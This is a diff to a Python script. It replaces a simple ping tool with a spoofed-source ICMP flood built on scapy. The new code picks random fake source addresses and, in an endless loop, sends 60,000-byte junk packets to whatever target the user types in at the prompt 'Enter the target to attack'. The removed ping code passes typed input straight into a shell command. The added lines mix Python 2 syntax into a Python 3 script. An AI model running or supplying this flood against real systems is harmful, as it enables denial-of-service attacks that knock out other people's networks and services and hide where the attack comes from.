@@ -61,27 +61,27 @@ print("""\033[31m
 time.sleep(2)
 
 
-import os, random
-os.system("title %random% %date% %username% %time% %random%")
+from scapy.all import *
+import random
 
-random = random.randint(1, 9)
-os.system(f"color {random}")
-def y():
-	IP = input("Enter an IP to ping: => ")
-	os.system(f"ping {IP} -t")
-def n():
-	IP = input("Enter an IP to ping: ")
-	os.system(f"ping {IP} -n 20")
-def clear():
-	os.system("cls")
 
-clear()
-yorn = input("Would you like to ping infinitely? y or n : => ")
-if yorn == "y":
-	clear()
-	os.system(f"color {random}")
-	y()
-else:
-	clear()
-	os.system(f"color {random}")
-	n()
+def address_spoofer():
+    
+    addr = [192, 168, 0 , 1]
+    d = '.'
+    addr[0] = str(random.randrange(11,197))
+    addr[1] = str(random.randrange(0,255))
+    addr[2] = str(random.randrange(0,255))
+    addr[3] = str(random.randrange(2,254))
+    assemebled = addr[0]+d+addr[1]+d+addr[2]+d+addr[3]
+    print assemebled
+    return assemebled
+
+target = raw_input("Enter the target to attack: => ")
+
+while True:
+
+    rand_addr = address_spoofer()
+    ip_hdr = IP(src=rand_addr, dst=target)
+    packet = ip_hdr/ICMP()/("m"*60000) #send 60k bytes of junk
+    send(packet)
